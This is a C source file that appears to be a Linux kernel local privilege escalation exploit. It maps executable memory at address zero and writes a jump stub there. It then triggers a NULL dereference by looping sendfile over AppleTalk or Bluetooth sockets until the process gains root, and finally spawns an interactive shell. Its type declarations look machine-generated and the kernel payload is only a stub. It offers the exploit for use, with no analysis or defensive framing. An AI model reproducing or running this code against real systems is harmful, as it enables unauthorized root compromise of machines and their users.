
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int MAP_ANONYMOUS ;
 void* MAP_FAILED ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int O_RDONLY ;
 scalar_t__ PER_SVR4 ;
 int PF_APPLETALK ;
 int PF_BLUETOOTH ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SOCK_DGRAM ;
 int close (int) ;
 int execl (char*,char*,char*,int *) ;
 int fprintf (int ,char*) ;
 int getgid () ;
 scalar_t__ getuid () ;
 int gid ;
 int kernel ;
 void* mmap (int,int,int,int,int ,int ) ;
 int mprotect (int,int,int) ;
 int open (char*,int ) ;
 int perror (char*) ;
 scalar_t__ personality (int) ;
 int sendfile (int,int,int*,int) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 scalar_t__ uid ;

int main(int argc,char *argv[])
{
 int fd_in=0,fd_out=0,offset=1;
 void *zero_page;

 uid=getuid();
 gid=getgid();
 if(uid==0){
  fprintf(stderr,"[-] check ur uid\n");
  return -1;
 }




 if(personality(0xffffffff)==PER_SVR4){
  if(mprotect(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)==-1){
   perror("[-] mprotect()");
   return -1;
  }
 }
 else if((zero_page=mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0))==MAP_FAILED){
   perror("[-] mmap()");
   return -1;
 }
 *(char *)0x00000000=0xff;
 *(char *)0x00000001=0x25;
 *(unsigned long *)0x00000002=(unsigned long)&kernel;
 *(char *)0x00000006=0xc3;

 if((fd_in=open(argv[0],O_RDONLY))==-1){
  perror("[-] open()");
  return -1;
 }
 if((fd_out=socket(PF_APPLETALK,SOCK_DGRAM,0))==-1){
  if((fd_out=socket(PF_BLUETOOTH,SOCK_DGRAM,0))==-1){
   perror("[-] socket()");
   return -1;
  }
 }
gogossing:




 if(sendfile(fd_out,fd_in,&offset,2)==-1){
  if(offset==0){
   perror("[-] sendfile()");
   return -1;
  }
  close(fd_out);
  fd_out=socket(PF_BLUETOOTH,SOCK_DGRAM,0);
 }
 if(getuid()==uid){
  if(offset){
   offset=0;
  }
  goto gogossing;
 }
 close(fd_in);
 close(fd_out);

 execl("/bin/sh","sh","-i",((void*)0));
 return 0;
}
